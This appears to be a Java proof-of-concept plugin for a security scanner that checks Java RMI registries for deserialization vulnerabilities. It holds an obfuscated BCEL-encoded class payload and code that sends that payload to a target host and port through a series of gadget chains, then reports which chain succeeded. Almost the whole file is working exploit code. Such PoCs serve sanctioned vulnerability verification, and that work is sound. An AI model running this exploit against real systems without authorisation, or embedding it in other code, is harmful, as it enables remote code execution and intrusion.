package me.gv7.woodpecker.plugin.poc;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;

import static me.gv7.woodpecker.plugin.JavaRMIVulPlugin.gadgets;

public class RmiDeserialPoc implements IPoc {
    private final static String verifyBCEL = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8d$92$5bO$db$40$Q$85$cf$sNl$8c$5b$m$84$84$f4F$m$5cL$80F$e25$88$H$aaVE$8a$a0R$Q$So8$f6$S$W9$b6$b5Y$p$f8c$E5R$fb$de$lU1$9b$m$o$K$P$b5e$cf$ccj$cewfW$fb$e7$ef$cf_$Av$b1c$c3A$c5$c4$3b$T$efmdQ$b1$f0A$c7$8f$W$3e$d9XBU$X$cb62X1Q3$b1$ca$90$df$T$91P$fb$M$Ln$eb$ca$bb$f6$g$a1$Xu$hm$rE$d4mn$9e2$Y_$e2$803$cc$b4D$c4$8f$d2$5e$87$cb$T$af$T$d2J$a1$V$fb$5ex$eaI$a1$eb$c7EC$5d$8a$3e$83$d3$3a$3a$3c$fe$eeEA$c8e$93$n$eb$f7$C$zxa$c0$60$7f$bd$f1y$a2D$i$91$ccn$c7$a9$f4$f97$a1Q$ab$T$c4g$z$ac$5e$c8$b8W$3d$8c$92T$e9$86$e3$ce$V$f7$95$837Xc$98$9f$90$9fx$M$e5$7f$fd$OR$R$G$5c$d2$40$b5Z$cd$c1$3a6$Y$ac$b4O$G$81$90$s$5c$H$9b$a8$3b$d8$c2$b6$e6$be$a5$81$s30$ccNpcs$e2$b8$fa$88$f2$5e$92$f0$88v$b8$f3$da$Z$beXz$9c$a2$f9$8c$d8$be$ed$x$dec$98$eer$f5C$c6$J$97$ea$96a$fd$bf$80D$b2T$3c$ce$Z$8a$ee$x$jX$c64$dd$N$fd0zist$Jf$a8$3a$87A$Z$e0$d6$H$60Cd$ce$86$c8$9e$N$60$Urw$c8$X$cc$7bX$3a$ea$e2$OS$D$d8$bf$a97$83Y$fa$db$p$5d$8e$f4y$ccQV$gsP$c0$fc$c8$c7E$R$L$e4U$a2$dc$a0$98$a1$af$3cR$_$3e$A$90Gs$8a$b1$C$A$A";
    @Override
    public IScanResult doVerify(ITarget target, IResultOutput resultOutput) {
        String host = target.getHost();
        int port = target.getPort();

        IScanResult scanResult = JavaRMIVulPlugin.pluginHelper.createScanResult();
        scanResult.setTarget(target.getAddress());
        for(String gadget:gadgets){
            String result = null;
            try{
                Object objPayload = CommonUtil.generator(gadget,String.format("bcel_with_args:%s|x",verifyBCEL));
                if(objPayload == null){
                    continue;
                }
                result = RMIRegistryExploit.sendPayload(host,port,objPayload);
            } catch (Throwable e) {
                resultOutput.infoPrintln("erro: " + gadget);
                resultOutput.errorPrintln(JavaRMIVulPlugin.pluginHelper.getThrowableInfo(e));
            }

            if(result != null){
                String msg = String.format("%s:%d存在漏洞！返回信息：%s, 可用gadget:%s",host,port,result,gadget);
                resultOutput.successPrintln(msg);
                scanResult.setExists(true);
                scanResult.setMsg(msg);
            }else{
                resultOutput.failPrintln(String.format("%s:%d gadget:%s不可用",host,port,gadget));
            }
        }
        return scanResult;
    }
}
